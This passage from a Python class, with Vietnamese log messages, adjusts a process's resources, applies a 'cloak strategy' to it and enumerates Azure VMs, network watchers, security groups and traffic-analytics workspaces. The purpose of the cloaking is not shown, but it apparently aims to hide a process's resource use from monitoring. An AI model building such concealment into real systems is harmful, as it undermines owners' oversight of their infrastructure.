                'args': (process, network_bandwidth_limit_mbps)
            }
            self.resource_adjustment_queue.put((3, adjustment_task))

            self.shared_resource_manager.apply_cloak_strategy('cache', process)

            self.logger.info(f"Áp dụng thành công các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}).")
        except Exception as e:
            self.logger.error(f"Lỗi khi áp dụng các điều chỉnh tài nguyên dựa trên Azure OpenAI cho tiến trình {process.name} (PID: {process.pid}): {e}")

    def shutdown_power_management(self):
        try:
            shutdown_power_management()
            self.logger.info("Đóng các dịch vụ quản lý công suất thành công.")
        except Exception as e:
            self.logger.error(f"Lỗi khi đóng các dịch vụ quản lý công suất: {e}")

    def discover_azure_resources(self):
        try:
            self.vms = self.azure_monitor_client.discover_resources('Microsoft.Compute/virtualMachines')
            self.logger.info(f"Khám phá {len(self.vms)} Máy ảo.")

            self.network_watchers = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkWatchers')
            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")

            self.nsgs = self.azure_network_watcher_client.discover_resources('Microsoft.Network/networkSecurityGroups')
            self.logger.info(f"Khám phá {len(self.nsgs)} Network Security Groups.")

            self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
            self.logger.info(f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces.")

            self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
            self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
        except Exception as e:
            self.logger.error(f"Lỗi khi khám phá tài nguyên Azure: {e}")
